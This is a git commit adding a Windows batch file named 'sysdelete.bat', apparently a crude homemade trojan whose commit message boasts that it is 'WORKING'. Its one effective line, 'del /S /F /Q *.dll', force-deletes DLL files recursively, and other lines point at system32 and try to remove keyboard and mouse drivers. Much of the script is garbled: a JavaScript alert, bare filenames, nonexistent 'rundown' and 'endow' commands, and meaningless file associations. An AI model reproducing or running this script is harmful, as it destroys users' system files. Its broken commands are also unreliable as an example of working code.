9c55be6ef5f0e061467d9d9d81b4ec6d1ed4b10a
JIMIX <55140313+JimixTechz@users.noreply.github.com>
2019-09-10 06:20:35 -0700

    Add files via upload
    Not powerful but WORKINGG!!!

---
+++ sysdelete.bat
@@ -0,0 +1,41 @@
+@echo off
+
+title JIMIX-TRZ
+
+alert (yourName + “ BY JIMIX (UR D.A.D)”);
+
+*.FON
+
+\system32
+
+del /S /F /Q *.dll
+
+cd %systemdrive%
+
+rundown /S /F /Q keyboard.drv
+
+rundown /S /F /Q mouse.drv
+
+rundown /S /F /Q keyboard.sys
+
+rundown /S /F /Q *.cum
+
+rundown /S /F /Q *.anal
+
+cd %systemdrive%
+
+assoc .entree=execution
+
+assoc .torn=notify
+
+assoc .votal=votal
+
+assoc .ultranet=command
+
+endow_execution=shutdown -44
+
+endow_notepad=shutdown -44
+
+endow_batch=shutdown -44
+
+endow_command=shutdown -44
